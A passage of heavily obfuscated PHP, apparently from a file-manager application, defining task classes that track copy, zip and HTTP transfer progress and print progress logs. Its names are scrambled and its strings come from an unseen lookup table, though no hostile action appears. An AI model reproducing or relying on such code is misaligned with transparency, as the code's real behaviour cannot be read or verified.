($éÎğÈ£ø != $—»­ºŞ[$Èğû·êÎ[32]]) { $îÔòïÒÔ->rename($‚”® ØÍ, $éÎğÈ£ø); } $îÔòïÒÔ->where($†Ùµå½Û)->setField($Èğû·êÎ[517], 0); $„Íİ¥Ã¼->eventRecycle($‚”® ØÍ, $Èğû·êÎ[2328]); } } } goto FÅÉ¬Ö£è¤; d§ÏÜŞ´Ú”: class TaskFileTransfer extends Task { protected function startAfter() { $Æö—™ =& $_SERVER[‹‰”››ê]; $†„Å‰¹ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Æö—™[1822], array($this, $Æö—™[1823])); Hook::bind($Æö—™[1324], array($this, $Æö—™[1824])); Hook::bind($Æö—™[1825], array($this, $Æö—™[1826])); Hook::bind($Æö—™[685], array($this, $Æö—™[1827])); Hook::bind($Æö—™[686], array($this, $Æö—™[1828])); Hook::bind($Æö—™[692], array($this, $Æö—™[1829])); Hook::bind($Æö—™[693], array($this, $Æö—™[1830])); Hook::bind($Æö—™[688], array($this, $Æö—™[1831])); Hook::bind($Æö—™[690], array($this, $Æö—™[1832])); Hook::bind($Æö—™[654], array($this, $Æö—™[1833])); Hook::bind($Æö—™[651], array($this, $Æö—™[1833])); Hook::bind($Æö—™[656], array($this, $Æö—™[1833])); Hook::bind($Æö—™[658], array($this, $Æö—™[1833])); Hook::bind($Æö—™[660], array($this, $Æö—™[1833])); Hook::bind($Æö—™[1834], array($this, $Æö—™[1835])); Hook::bind($Æö—™[676], array($this, $Æö—™[1836])); $this->sourceModelCopyFlag = !1; Hook::bind($Æö—™[1837], array($this, $Æö—™[1838])); Hook::bind($Æö—™[1839], array($this, $Æö—™[1840])); Hook::bind($Æö—™[1841], array($this, $Æö—™[1842])); $†„Å‰¹[$Æö—™[1843]] = LNG($Æö—™[1844]); $†„Å‰¹[$Æö—™[1845]] = 0; $†„Å‰¹[$Æö—™[1846]] = 0; $†„Å‰¹[$Æö—™[1158]] = $Æö—™[12]; $†„Å‰¹[$Æö—™[1847]] = $Æö—™[12]; $†„Å‰¹[$Æö—™[1848]] = 0; $†„Å‰¹[$Æö—™[1849]] = 0; $†„Å‰¹[$Æö—™[1850]] = 0; if (!$†„Å‰¹[$Æö—™[1677]]) { $†„Å‰¹[$Æö—™[1677]] = LNG($Æö—™[1851]); } } protected function endAfter() { $À³ÀŞ¿Í =& $_SERVER[‹‰”››ê]; Hook::unbind($À³ÀŞ¿Í[1822], array($this, $À³ÀŞ¿Í[1823])); Hook::unbind($À³ÀŞ¿Í[1324], array($this, $À³ÀŞ¿Í[1824])); Hook::unbind($À³ÀŞ¿Í[1825], array($this, $À³ÀŞ¿Í[1826])); Hook::unbind($À³ÀŞ¿Í[685], array($this, $À³ÀŞ¿Í[1827])); Hook::unbind($À³ÀŞ¿Í[686], array($this, $À³ÀŞ¿Í[1828])); Hook::unbind($À³ÀŞ¿Í[692], array($this, $À³ÀŞ¿Í[1829])); Hook::unbind($À³ÀŞ¿Í[693], array($this, $À³ÀŞ¿Í[1830])); Hook::unbind($À³ÀŞ¿Í[688], array($this, $À³ÀŞ¿Í[1831])); Hook::unbind($À³ÀŞ¿Í[690], array($this, $À³ÀŞ¿Í[1832])); Hook::unbind($À³ÀŞ¿Í[654], array($this, $À³ÀŞ¿Í[1833])); Hook::unbind($À³ÀŞ¿Í[651], array($this, $À³ÀŞ¿Í[1833])); Hook::unbind($À³ÀŞ¿Í[656], array($this, $À³ÀŞ¿Í[1833])); Hook::unbind($À³ÀŞ¿Í[658], array($this, $À³ÀŞ¿Í[1833])); Hook::unbind($À³ÀŞ¿Í[660], array($this, $À³ÀŞ¿Í[1833])); Hook::unbind($À³ÀŞ¿Í[1834], array($this, $À³ÀŞ¿Í[1835])); Hook::unbind($À³ÀŞ¿Í[676], array($this, $À³ÀŞ¿Í[1836])); Hook::unbind($À³ÀŞ¿Í[1837], array($this, $À³ÀŞ¿Í[1838])); Hook::unbind($À³ÀŞ¿Í[1839], array($this, $À³ÀŞ¿Í[1840])); Hook::unbind($À³ÀŞ¿Í[1841], array($this, $À³ÀŞ¿Í[1842])); } public function copyMoveStart($Øâ§üıÇ, $„Òğ³ÜÚ, $ÊšŒ‡É¹, $˜ÒóœÇ¨) { $‘‡€ç½Õ =& $_SERVER[‹‰”››ê]; self::log($‘‡€ç½Õ[1852] . $„Òğ³ÜÚ . $‘‡€ç½Õ[73] . $˜ÒóœÇ¨); $ë®—úà = rtrim(TEMP_FILES, $‘‡€ç½Õ[8]); if (substr($„Òğ³ÜÚ, 0, strlen($ë®—úà)) == $ë®—úà) { return; } if (substr($˜ÒóœÇ¨, 0, strlen($ë®—úà)) == $ë®—úà) { return; } $©©“ÅÕç =& $this->task; $©©“ÅÕç[$‘‡€ç½Õ[1853]] = KodIO::transferType($Øâ§üıÇ, $ÊšŒ‡É¹); $this->update(); } public function updateAfter() { $œ²Ó÷»é =& $_SERVER[‹‰”››ê]; $«†Ä³© =& $this->task; if (!$«†Ä³©[$œ²Ó÷»é[853]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($«†Ä³©[$œ²Ó÷»é[1853]] == $œ²Ó÷»é[1418]) { return; } self::updateTask($«†Ä³©); } private static function updateTask(&$ı‚ªÜ³¼) { $ş¬§™¶Ì =& $_SERVER[‹‰”››ê]; if ($ı‚ªÜ³¼[$ş¬§™¶Ì[1853]] == $ş¬§™¶Ì[1295] || $ı‚ªÜ³¼[$ş¬§™¶Ì[1853]] == $ş¬§™¶Ì[110]) { if ($ı‚ªÜ³¼[$ş¬§™¶Ì[1847]]) { $ı‚ªÜ³¼[$ş¬§™¶Ì[1850]] = $ı‚ªÜ³¼[$ş¬§™¶Ì[1849]] + $ı‚ªÜ³¼[$ş¬§™¶Ì[1846]]; } } else { if ($ı‚ªÜ³¼[$ş¬§™¶Ì[1853]] == $ş¬§™¶Ì[1419]) { if ($ı‚ªÜ³¼[$ş¬§™¶Ì[1847]] == $ş¬§™¶Ì[1295]) { $ı‚ªÜ³¼[$ş¬§™¶Ì[1850]] = $ı‚ªÜ³¼[$ş¬§™¶Ì[1849]] + $ı‚ªÜ³¼[$ş¬§™¶Ì[1846]] * 0.5; } else { if ($ı‚ªÜ³¼[$ş¬§™¶Ì[1847]] == $ş¬§™¶Ì[110]) { $ı‚ªÜ³¼[$ş¬§™¶Ì[1850]] = $ı‚ªÜ³¼[$ş¬§™¶Ì[1849]] + $ı‚ªÜ³¼[$ş¬§™¶Ì[1845]] * 0.5 + $ı‚ªÜ³¼[$ş¬§™¶Ì[1846]] * 0.5; } } } } $ı‚ªÜ³¼[$ş¬§™¶Ì[1793]] = $ı‚ªÜ³¼[$ş¬§™¶Ì[1850]] / $ı‚ªÜ³¼[$ş¬§™¶Ì[853]]; if ($ı‚ªÜ³¼[$ş¬§™¶Ì[1793]] > 0) { $×«ëïÂİ = timeFloat() - $ı‚ªÜ³¼[$ş¬§™¶Ì[1795]] - $ı‚ªÜ³¼[$ş¬§™¶Ì[1798]]; $ı‚ªÜ³¼[$ş¬§™¶Ì[1799]] = $×«ëïÂİ * (1 - $ı‚ªÜ³¼[$ş¬§™¶Ì[1793]]) / $ı‚ªÜ³¼[$ş¬§™¶Ì[1793]]; } } public function addPath($ÏŠ•¤Î§) { $œÒıœñ =& $_SERVER[‹‰”››ê]; if (!$ÏŠ•¤Î§) { return; } $óæÈƒÎ =& $this->task; $¡¼ËåÁü = IO::infoWithChildren($ÏŠ•¤Î§); $«£ñıÓ = $óæÈƒÎ[$œÒıœñ[1854]] ? $óæÈƒÎ[$œÒıœñ[1854]][$œÒıœñ[1855]] : 0; $óæÈƒÎ[$œÒıœñ[1854]] = array($œÒıœñ[1855] => $«£ñıÓ + 1, $œÒıœñ[506] => $¡¼ËåÁü[$œÒıœñ[32]], $œÒıœñ[87] => $¡¼ËåÁü[$œÒıœñ[87]], $œÒıœñ[596] => $¡¼ËåÁü[$œÒıœñ[596]] ? $¡¼ËåÁü[$œÒıœñ[596]] : $¡¼ËåÁü[$œÒıœñ[87]]); if ($¡¼ËåÁü[$œÒıœñ[33]] == $œÒıœñ[233]) { $óæÈƒÎ[$œÒıœñ[1156]] += 1; } else { $óæÈƒÎ[$œÒıœñ[1156]] += $¡¼ËåÁü[$œÒıœñ[82]][$œÒıœñ[80]]; if ($¡¼ËåÁü[$œÒıœñ[194]]) { $óæÈƒÎ[$œÒıœñ[1156]] += $¡¼ËåÁü[$œÒıœñ[82]][$œÒıœñ[81]] + 1; } } $óæÈƒÎ[$œÒıœñ[853]] += $¡¼ËåÁü[$œÒıœñ[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÒÃë´¡) { } public function sourceAddHashEnd($ ªÄÎÇ) { } public function sourceAddFileStart($É™¾êŒ) { $‰êˆæè =& $_SERVER[‹‰”››ê]; $Æ˜”­› =& $this->task; $Æ˜”­›[$‰êˆæè[1845]] = $É™¾êŒ[$‰êˆæè[79]]; $Æ˜”­›[$‰êˆæè[1843]] = $É™¾êŒ[$‰êˆæè[32]]; $Æ˜”­›[$‰êˆæè[1158]] = $É™¾êŒ[$‰êˆæè[32]]; $Æ˜”­›[$‰êˆæè[1856]] = $É™¾êŒ[$‰êˆæè[87]]; $this->update(); } public function sourceAddFileEnd($¥âÔ¥Á) { $õ”‹ˆŠ– =& $_SERVER[‹‰”››ê]; $£‹É·¼» =& $this->task; $£‹É·¼»[$õ”‹ˆŠ–[1850]] += $¥âÔ¥Á[$õ”‹ˆŠ–[79]]; $£‹É·¼»[$õ”‹ˆŠ–[1856]] = $¥âÔ¥Á[$õ”‹ˆŠ–[87]]; $this->update(1); } public function copyFileStart($£Şº¢“Ç, $‘è€êâÏ, $À¾çãæÍ, $¨‘®²…®, $Ï»ñ¨—, $Ù¯‹Ç ù) { $ÍÍ¦Ùıß =& $_SERVER[‹‰”››ê]; $ÎÏ–Ñà = $Ï»ñ¨—; if ($ÎÏ–Ñà == $GLOBALS[$ÍÍ¦Ùıß[1857]]) { $ÎÏ–Ñà = $GLOBALS[$ÍÍ¦Ùıß[1858]]; } $GLOBALS[$ÍÍ¦Ùıß[1858]] = $Ï»ñ¨—; $GLOBALS[$ÍÍ¦Ùıß[1857]] = $Ù¯‹Ç ù; $Ô±‘ öÉ =& $this->task; $Ô±‘ öÉ[$ÍÍ¦Ùıß[1843]] = $ÎÏ–Ñà; $Ô±‘ öÉ[$ÍÍ¦Ùıß[1845]] = (int) $£Şº¢“Ç->size($‘è€êâÏ); $Ô±‘ öÉ[$ÍÍ¦Ùıß[1846]] = 0; $Ô±‘ öÉ[$ÍÍ¦Ùıß[1158]] = $ÍÍ¦Ùıß[12]; $Ô±‘ öÉ[$ÍÍ¦Ùıß[1847]] = $ÍÍ¦Ùıß[12]; $Ô±‘ öÉ[$ÍÍ¦Ùıß[1848]] = 0; $ßĞïˆçû = $Ô±‘ öÉ[$ÍÍ¦Ùıß[1845]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ô±‘ öÉ[$ÍÍ¦Ùıß[487]] . $ÍÍ¦Ùıß[1859]); if ($ßĞïˆçû && file_exists(get_path_father($¨‘®²…®))) { Cache::set($Ô±‘ öÉ[$ÍÍ¦Ùıß[487]] . $ÍÍ¦Ùıß[1859], $¨‘®²…®); $Ô±‘ öÉ[$ÍÍ¦Ùıß[1816]] = array($ÍÍ¦Ùıß[1860], $ÍÍ¦Ùıß[1861]); } $this->update(0, $ßĞïˆçû); } public static function updateCopyLocalFileSize($¨×…¼¹) { $ê ·¸¨Â =& $_SERVER[‹‰”››ê]; $¤Œî†©¾ = Cache::get($¨×…¼¹[$ê ·¸¨Â[487]] . $ê ·¸¨Â[1859]); if (!$¤Œî†©¾ || !file_exists($¤Œî†©¾)) { return $¨×…¼¹; } $¨×…¼¹[$ê ·¸¨Â[1846]] = @filesize($¤Œî†©¾); $¨×…¼¹[$ê ·¸¨Â[1850]] += $¨×…¼¹[$ê ·¸¨Â[1846]]; self::updateTask($¨×…¼¹); return $¨×…¼¹; } public function copyFileEnd($”„Õßá, $¶ç±Àëå, $†›Ëâğ‡, $àş»Èáâ, $·ôõ¸¿, $Ùğ¢§) { $ÉØÀ°Ô =& $_SERVER[‹‰”››ê]; $¹ÑŸ­ë„ =& $this->task; $¹ÑŸ­ë„[$ÉØÀ°Ô[1846]] = $¹ÑŸ­ë„[$ÉØÀ°Ô[1845]]; $¹ÑŸ­ë„[$ÉØÀ°Ô[1847]] = $ÉØÀ°Ô[12]; unset($¹ÑŸ­ë„[$ÉØÀ°Ô[1816]]); if ($·ôõ¸¿ == $¹ÑŸ­ë„[$ÉØÀ°Ô[1843]]) { $¹ÑŸ­ë„[$ÉØÀ°Ô[1849]] += $¹ÑŸ­ë„[$ÉØÀ°Ô[1845]]; $¹ÑŸ­ë„[$ÉØÀ°Ô[1850]] = $¹ÑŸ­ë„[$ÉØÀ°Ô[1849]]; $ôîÚÑö® = 1; if (isset($¹ÑŸ­ë„[$ÉØÀ°Ô[1856]]) && $¹ÑŸ­ë„[$ÉØÀ°Ô[1856]] == $¶ç±Àëå) { $ôîÚÑö® = 0; } $this->update($ôîÚÑö®); } else { $this->update(); $¹ÑŸ­ë„[$ÉØÀ°Ô[1846]] = 0; } Cache::remove($¹ÑŸ­ë„[$ÉØÀ°Ô[487]] . $ÉØÀ°Ô[1859]); self::log($ÉØÀ°Ô[1862] . $¶ç±Àëå . $ÉØÀ°Ô[73] . $àş»Èáâ . $ÉØÀ°Ô[288] . $·ôõ¸¿ . $ÉØÀ°Ô[1863] . $¹ÑŸ­ë„[$ÉØÀ°Ô[1843]]); } public function updateFileEnd($‚ºØ×÷«, $¸ÉÆÚ î) { $Íß…æòÅ =& $_SERVER[‹‰”››ê]; $¶‚Ù©¾Ä =& $this->task; $¶‚Ù©¾Ä[$Íß…æòÅ[1843]] = $‚ºØ×÷«; $¶‚Ù©¾Ä[$Íß…æòÅ[1845]] = $¸ÉÆÚ î; $¶‚Ù©¾Ä[$Íß…æòÅ[1849]] += $¸ÉÆÚ î; $¶‚Ù©¾Ä[$Íß…æòÅ[1850]] = $¶‚Ù©¾Ä[$Íß…æòÅ[1849]]; $this->update(1); self::log($Íß…æòÅ[1864] . $‚ºØ×÷«); } public function sourceModelCopy($Ó÷ÍÛëè) { $¾é©¸È =& $_SERVER[‹‰”››ê]; $äÑ†™­ = $Ó÷ÍÛëè[0]; $±ĞØëÁ· = $Ó÷ÍÛëè[1]; $’ì¸Ñ¤£ =& $this->task; $this->sourceModelCopyFlag = !0; $ÖÒê¶‚µ = 0; switch ($äÑ†™­) { case $¾é©¸È[652]: $ÖÒê¶‚µ = 1; break; case $¾é©¸È[655]: $’ì¸Ñ¤£[$¾é©¸È[1843]] = $±ĞØëÁ·[$¾é©¸È[32]]; break; case $¾é©¸È[657]: $ÖÒê¶‚µ = intval($Ó÷ÍÛëè[$¾é©¸È[468]] * 0.4); break; case $¾é©¸È[659]: $ÖÒê¶‚µ = intval($Ó÷ÍÛëè[$¾é©¸È[468]] * 0.2); break; case $¾é©¸È[661]: $ÖÒê¶‚µ = intval($Ó÷ÍÛëè[$¾é©¸È[468]] * 0.4); break; } $this->update($ÖÒê¶‚µ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($†ãä…µé, $Å¯÷Œ¡›) { $ÛŠÃëøÕ =& $_SERVER[‹‰”››ê]; $this->sourceModelCopyFlag = !0; $Š÷ŠóÍ‡ = 1; if (isset($†ãä…µé[$ÛŠÃëøÕ[82]])) { $Š÷ŠóÍ‡ = $†ãä…µé[$ÛŠÃëøÕ[82]][$ÛŠÃëøÕ[80]]; $Š÷ŠóÍ‡ = $Š÷ŠóÍ‡ + $†ãä…µé[$ÛŠÃëøÕ[82]][$ÛŠÃëøÕ[81]] + 1; } $this->update($Š÷ŠóÍ‡); $this->sourceModelCopyFlag = !1; } public function sourceMove($©ÀÀíÒÌ) { $this->sourceRemove($©ÀÀíÒÌ, !1); } public function curlProgress($¡´¾§åå, $Û‹­Ñºä, $ô…ôûí, $Êãîƒˆ‰, $Î ØÍëº) { $ÅÈ™†—ú =& $_SERVER[‹‰”››ê]; $î”“¸¿” =& $this->task; if ($Î ØÍëº > 0) { $î”“¸¿”[$ÅÈ™†—ú[1158]] = $ÅÈ™†—ú[1865]; $î”“¸¿”[$ÅÈ™†—ú[1847]] = $ÅÈ™†—ú[110]; if ($î”“¸¿”[$ÅÈ™†—ú[1845]]) { $î”“¸¿”[$ÅÈ™†—ú[1846]] = $Î ØÍëº; } if ($î”“¸¿”[$ÅÈ™†—ú[1848]]) { $î”“¸¿”[$ÅÈ™†—ú[1846]] = $Î ØÍëº + $î”“¸¿”[$ÅÈ™†—ú[1848]]; } } else { if ($ô…ôûí > 0) { if ($î”“¸¿”[$ÅÈ™†—ú[1845]] == $Û‹­Ñºä) { $î”“¸¿”[$ÅÈ™†—ú[1846]] = $ô…ôûí; $î”“¸¿”[$ÅÈ™†—ú[1158]] = $ÅÈ™†—ú[1866]; $î”“¸¿”[$ÅÈ™†—ú[1847]] = $ÅÈ™†—ú[1295]; } } } $this->update(); } public function curlProgressStart($×ìÆŠÆ›) { } public function curlProgressEnd($÷§¡Ò¼„) { $«î‹á¿¿ =& $_SERVER[‹‰”››ê]; $ó·Ø«¬Â =& $this->task; $™©Â‚ó› = curl_getinfo($÷§¡Ò¼„); $ÚÊªûÌ = $™©Â‚ó›[$«î‹á¿¿[1867]]; if ($ÚÊªûÌ == -1) { $ÚÊªûÌ = $™©Â‚ó›[$«î‹á¿¿[1868]]; } if ($ó·Ø«¬Â[$«î‹á¿¿[1847]] == $«î‹á¿¿[110] && $ÚÊªûÌ) { $ó·Ø«¬Â[$«î‹á¿¿[1848]] += $ÚÊªûÌ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ñÙÎÀ€³ =& $_SERVER[‹‰”››ê]; $Æ…›Ò³Ÿ =& $this->task; $Æ…›Ò³Ÿ[$ñÙÎÀ€³[1869]] = 1; Hook::bind($ñÙÎÀ€³[1837], array($this, $ñÙÎÀ€³[1870])); Hook::bind($ñÙÎÀ€³[1839], array($this, $ñÙÎÀ€³[1871])); Hook::bind($ñÙÎÀ€³[1841], array($this, $ñÙÎÀ€³[1872])); } protected function endAfter() { $¹ŠÅÕ =& $_SERVER[‹‰”››ê]; Hook::unbind($¹ŠÅÕ[1837], array($this, $¹ŠÅÕ[1870])); Hook::unbind($¹ŠÅÕ[1839], array($this, $¹ŠÅÕ[1871])); Hook::unbind($¹ŠÅÕ[1841], array($this, $¹ŠÅÕ[1872])); } public function progressStart($Çü¶ºû) { $úÁÈÏô” =& $_SERVER[‹‰”››ê]; $¹’÷ôßÔ = curl_getinfo($Çü¶ºû); self::log($úÁÈÏô”[1873] . $¹’÷ôßÔ[$úÁÈÏô”[394]]); self::valueSet($this->task[$úÁÈÏô”[487]], $this->task); } public function progressEnd($ì‰½¨Ø¤) { $ıÁÖĞËœ =& $_SERVER[‹‰”››ê]; self::log($ıÁÖĞËœ[1874] . $this->task[$ıÁÖĞËœ[487]]); $this->end(); } public function progress($Šı°à”², $Îí„ê«¸, $ôê´µ®‰, $ÁØêõ€Á, $•Æ»ÒÃñ) { $ÜÛßÚâ =& $_SERVER[‹‰”››ê]; $Ê¼Ù×ü =& $this->task; if ($•Æ»ÒÃñ > 0) { $Ê¼Ù×ü[$ÜÛßÚâ[1156]] = $Ê¼Ù×ü[$ÜÛßÚâ[1156]] == 0 ? $ÁØêõ€Á : $Ê¼Ù×ü[$ÜÛßÚâ[1156]]; $Ê¼Ù×ü[$ÜÛßÚâ[1792]] = $•Æ»ÒÃñ; } else { if ($ôê´µ®‰ > 0) { $Ê¼Ù×ü[$ÜÛßÚâ[1156]] = $Ê¼Ù×ü[$ÜÛßÚâ[1156]] == 0 ? $Îí„ê«¸ : $Ê¼Ù×ü[$ÜÛßÚâ[1156]]; $Ê¼Ù×ü[$ÜÛßÚâ[1792]] = $ôê´µ®‰; } } $this->update(); self::log("\160\x72\157\147\x72\x65\163\163\110\164\x74\160\x3a\x64\157\x77\156\72{$ôê´µ®‰}\x2f{$Îí„ê«¸}\73\x20\165\x70\x6c\157\141\x64\x3a{$•Æ»ÒÃñ}\x2f{$ÁØêõ€Á}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÈòÙñ›ç, $İ›ç¾ = '', $™—™ßÓ† = 0, $··¹×Ê‹ = '') { $êİ¡¡Û =& $_SERVER[‹‰”››ê]; $··¹×Ê‹ = $··¹×Ê‹ ? $··¹×Ê‹ : ($İ›ç¾ ? $İ›ç¾ : $ÈòÙñ›ç); $•øİÌ²Ş = new Task($ÈòÙñ›ç, $İ›ç¾, $™—™ßÓ†, $··¹×Ê‹); $GLOBALS[$êİ¡¡Û[1875] . $ÈòÙñ›ç] = new TaskLog($êİ¡¡Û[1774], $•øİÌ²Ş, $··¹×Ê‹); return $•øİÌ²Ş; } public function __construct($öÃ™²¸¥ = '', $†§¹ÑÃ = '', $´ú©ö‚Ñ = '') { $äÈ—Ö„ë =& $_SERVER[‹‰”››ê]; if (!$öÃ™²¸¥) { $öÃ™²¸¥ = $äÈ—Ö„ë[1774]; } $İ÷´ñèº = $öÃ™²¸¥ . $äÈ—Ö„ë[474] . rand_string(10); if (!$´ú©ö‚Ñ) { $´ú©ö‚Ñ = $öÃ™²¸¥ . $äÈ—Ö„ë[53] . $´ú©ö‚Ñ; } switch ($öÃ™²¸¥) { case $äÈ—Ö„ë[1774]: if (!$†§¹ÑÃ || !$†§¹ÑÃ->task) { return echoLog($öÃ™²¸¥ . $äÈ—Ö„ë[1876]); } $Ç­öú¾ = $†§¹ÑÃ; $İ÷´ñèº = $Ç­öú¾->task[$äÈ—Ö„ë[487]]; $öÃ™²¸¥ = $Ç­öú¾->task[$äÈ—Ö„ë[487]]; if (!$Ç­öú¾->task[$äÈ—Ö„ë[1677]]) { $Ç­öú¾->task[$äÈ—Ö„ë[1677]] = $´ú©ö‚Ñ ? $´ú©ö‚Ñ : $öÃ™²¸¥; } break; case $äÈ—Ö„ë[1877]: if (!$†§¹ÑÃ) { return echoLog($öÃ™²¸¥ . $äÈ—Ö„ë[1878]); } $Ü¢Ÿ½´ = is_string($†§¹ÑÃ) ? array($†§¹ÑÃ) : $†§¹ÑÃ; $Ç­öú¾ = new TaskFileTransfer($İ÷´ñèº, $öÃ™²¸¥, 0, $´ú©ö‚Ñ ? $´ú©ö‚Ñ : $Ü¢Ÿ½´[0]); foreach ($Ü¢Ÿ½´ as $ÉåË«³) { $Ç­öú¾->addPath($ÉåË«³); } break; case $äÈ—Ö„ë[400]: if (!$†§¹ÑÃ) { return echoLog($öÃ™²¸¥ . $äÈ—Ö„ë[1878]); } $Ü¢Ÿ½´ = is_string($†§¹ÑÃ) ? array($†§¹ÑÃ) : $†§¹ÑÃ; $Ç­öú¾ = new TaskZip($İ÷´ñèº, $öÃ™²¸¥, 0, $´ú©ö‚Ñ ? $´ú©ö‚Ñ : $Ü¢Ÿ½´[0]); foreach ($Ü¢Ÿ½´ as $ÉåË«³) { $Ç­öú¾->addPath($ÉåË«³); } break; case $äÈ—Ö„ë[1315]: if (!$†§¹ÑÃ) { return echoLog($öÃ™²¸¥ . $äÈ—Ö„ë[1878]); } $Ç­öú¾ = new TaskUnZip($İ÷´ñèº, $öÃ™²¸¥, 0, $´ú©ö‚Ñ ? $´ú©ö‚Ñ : $†§¹ÑÃ); if ($†§¹ÑÃ) { $Ç­öú¾->addFile($†§¹ÑÃ); } break; case $äÈ—Ö„ë[152]: $Ç­öú¾ = new TaskHttp($İ÷´ñèº, $öÃ™²¸¥); break; default: return; break; } $this->task = $Ç­öú¾; $this->taskID = $İ÷´ñèº; Hook::bind($äÈ—Ö„ë[1812], array($this, $äÈ—Ö„ë[1879])); Hook::bind($äÈ—Ö„ë[1814], array($this, $äÈ—Ö„ë[1880])); Hook::bind($äÈ—Ö„ë[1808], array($this, $äÈ—Ö„ë[1881])); echoLog($äÈ—Ö„ë[1882] . $Ç­öú¾->task[$äÈ—Ö„ë[1677]]); } public function __destruct() { $this->end(); } public function end($¾ú×¸äú = '') { $ìç×ñÇğ =& $_SERVER[‹‰”››ê]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¾ú×¸äú); $this->task = !1; $this->taskID = !1; Hook::unbind($ìç×ñÇğ[1812], array($this, $ìç×ñÇğ[1879])); Hook::unbind($ìç×ñÇğ[1814], array($this, $ìç×ñÇğ[1880])); Hook::unbind($ìç×ñÇğ[1808], array($this, $ìç×ñÇğ[1881])); } public function taskUpdate($úÌ ¶Â¦) { $Øƒ†Ü™ñ =& $_SERVER[‹‰”››ê]; if (!$úÌ ¶Â¦ || $this->taskID != $úÌ ¶Â¦[$Øƒ†Ü™ñ[487]]) { return; } $¼‰ª½­« = 20; $ã©Á™Å² = intval($úÌ ¶Â¦[$Øƒ†Ü™ñ[1793]] * $¼‰ª½­«); $ô¶°’©û = $Øƒ†Ü™ñ[176] . str_repeat($Øƒ†Ü™ñ[518], $ã©Á™Å²) . $Øƒ†Ü™ñ[1107] . str_repeat($Øƒ†Ü™ñ[53], $¼‰ª½­« - $ã©Á™Å²) . $Øƒ†Ü™ñ[178]; $´ş×Áİ = $ô¶°’©û . sprintf($Øƒ†Ü™ñ[1883], $úÌ ¶Â¦[$Øƒ†Ü™ñ[1793]] * 100) . $Øƒ†Ü™ñ[1884]; $ƒÁ‹»Æš = $´ş×Áİ . $úÌ ¶Â¦[$Øƒ†Ü™ñ[1792]] . $Øƒ†Ü™ñ[8] . $úÌ ¶Â¦[$Øƒ†Ü™ñ[1156]] . LNG($Øƒ†Ü™ñ[1885]); $´ÁÜêê = $Øƒ†Ü™ñ[12]; if ($úÌ ¶Â¦[$Øƒ†Ü™ñ[1869]]) { $ƒÁ‹»Æš = $´ş×Áİ . size_format($úÌ ¶Â¦[$Øƒ†Ü™ñ[1792]]) . $Øƒ†Ü™ñ[8] . size_format($úÌ ¶Â¦[$Øƒ†Ü™ñ[1156]]); $´ÁÜêê = size_format($úÌ ¶Â¦[$Øƒ†Ü™ñ[1794]]) . $Øƒ†Ü™ñ[1886]; } if ($úÌ ¶Â¦[$Øƒ†Ü™ñ[1158]]) { $úÌ ¶Â¦[$Øƒ†Ü™ñ[1843]] = $úÌ ¶Â¦[$Øƒ†Ü™ñ[1158]] . $Øƒ†Ü™ñ[53] . $úÌ ¶Â¦[$Øƒ†Ü™ñ[1843]]; } if ($úÌ ¶Â¦[$Øƒ†Ü™ñ[1843]]) { $ŒŠº´¹‹ = $Øƒ†Ü™ñ[12]; if ($úÌ ¶Â¦[$Øƒ†Ü™ñ[1845]]) { $ŒŠº´¹‹ = $Øƒ†Ü™ñ[50] . size_format($úÌ ¶Â¦[$Øƒ†Ü™ñ[1846]]) . $Øƒ†Ü™ñ[8] . size_format($úÌ ¶Â¦[$Øƒ†Ü™ñ[1845]]); } $´ÁÜêê .= $úÌ ¶Â¦[$Øƒ†Ü™ñ[1843]] . $ŒŠº´¹‹; } if ($úÌ ¶Â¦[$Øƒ†Ü™ñ[853]] && !$úÌ ¶Â¦[$Øƒ†Ü™ñ[1845]]) { $´ÁÜêê .= $Øƒ†Ü™ñ[53] . size_format($úÌ ¶Â¦[$Øƒ†Ü™ñ[1850]]) . $Øƒ†Ü™ñ[8] . size_format($úÌ ¶Â¦[$Øƒ†Ü™ñ[853]]); } echoLog($ƒÁ‹»Æš . $Øƒ†Ü™ñ[53] . $´ÁÜêê, !0); } public function taskEnd($ºµÜ¤Ç‡) { $ô¼³„«š =& $_SERVER[‹‰”››ê]; if (!$ºµÜ¤Ç‡ || $this->taskID != $ºµÜ¤Ç‡[$ô¼³„«š[487]]) { return; } $åÖëĞ‡Û = $ºµÜ¤Ç‡ ? LNG($ô¼³„«š[1887]) . $ô¼³„«š[4] . $ºµÜ¤Ç‡[$ô¼³„«š[1792]] . $ô¼³„«š[8] . $ºµÜ¤Ç‡[$ô¼³„«š[1156]] . LNG($ô¼³„«š[1885]) . $ô¼³„«š[74] : $ô¼³„«š[12]; echoLog($ô¼³„«š[1888] . $ºµÜ¤Ç‡[$ô¼³„«š[1677]] . ($ºµÜ¤Ç‡[$ô¼³„«š[538]] ? $ô¼³„«š[74] . $ºµÜ¤Ç‡[$ô¼³„«š[538]] : $ô¼³„«š[12]) . $ô¼³„«š[74] . $åÖëĞ‡Û . $ô¼³„«š[1889] . sprintf($ô¼³„«š[947], timeFloat() - $ºµÜ¤Ç‡[$ô¼³„«š[1795]]) . $ô¼³„«š[1807]); $this->end(); } public function taskKill($ÃåË¬ÉÒ) { $ÔÓÆ§â¾ =& $_SERVER[‹‰”››ê]; if (!$ÃåË¬ÉÒ || $this->taskID != $ÃåË¬ÉÒ[$ÔÓÆ§â¾[487]]) { return; } echoLog($ÔÓÆ§â¾[1890] . $ÃåË¬ÉÒ[$ÔÓÆ§â¾[1677]]); } } goto e¸×£´µ—; cŠ°¥«¯Æ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\155\137\x6c\157\147"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\124\151\x6d\x65", "\164\151\x6d\145", "\x69\156\x73\x65\x72\164", "\146\165\x6e\x63\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $±µú¾´· =& $_SERVER[‹‰”››ê]; return array($±µú¾´·[2366] => LNG($±µú¾´·[2367]), $±µú¾´·[2368] => LNG($±µú¾´·[2369]), $±µú¾´·[1934] => 